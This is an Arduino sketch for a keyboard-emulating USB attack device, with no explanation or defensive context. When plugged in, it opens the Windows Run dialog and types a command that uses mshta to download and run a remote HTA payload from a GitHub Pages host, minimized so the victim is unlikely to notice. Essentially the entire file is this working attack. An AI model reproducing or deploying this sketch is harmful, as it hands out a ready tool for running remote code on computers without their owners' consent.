#include "Keyboard.h"

#define BEGIN_DELAY 1000
#define PRESS_KEY_DELAY 50

#define COMBINATION(k1, k2) Keyboard.press(k1); Keyboard.press(k2); Keyboard.releaseAll()


void sequence()
{
  COMBINATION(KEY_LEFT_GUI, 'r');
  delay(500);
  press_key(KEY_DELETE);
  delay(500);
  Keyboard.print("cmd /c start /min mshta https://n643064.github.io/payload.hta");
  delay(500);
  press_key(KEY_RETURN);
}

void press_key(uint8_t key)
{
  Keyboard.press(key);
  delay(PRESS_KEY_DELAY);
  Keyboard.release(key);
}

void setup()
{
  pinMode(5, INPUT_PULLUP);
  if (digitalRead(5) == 0) // Don't run anything for easier uploading
    return;
   Keyboard.begin();
   delay(BEGIN_DELAY);
   sequence();
   Keyboard.end();
}

void loop()
{
  
}
